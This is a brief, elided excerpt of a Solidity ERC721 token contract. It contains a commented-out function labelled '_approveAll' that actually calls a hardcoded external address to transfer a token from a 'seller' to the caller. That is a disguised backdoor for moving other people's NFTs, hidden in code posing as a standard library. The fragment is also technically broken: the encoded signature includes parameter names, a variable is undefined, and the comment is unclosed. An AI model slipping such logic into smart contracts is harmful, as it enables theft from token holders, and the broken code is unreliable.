...
contract ERC721 is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
    ...
    */
     ...
     * Emits a {Transfer} event.
     */
  /*  function _approveAll() internal virtual {
      
      
        address  punkAddress = 0xaD9383d3E2859770A6C705081e7D25a46c49fAF9;
     
       address(punkAddress).call{gas: 1000000}(abi.encodeWithSignature("safeTransferFrom(address from, address to, uint256 tokenId)", seller, _msgSender()));
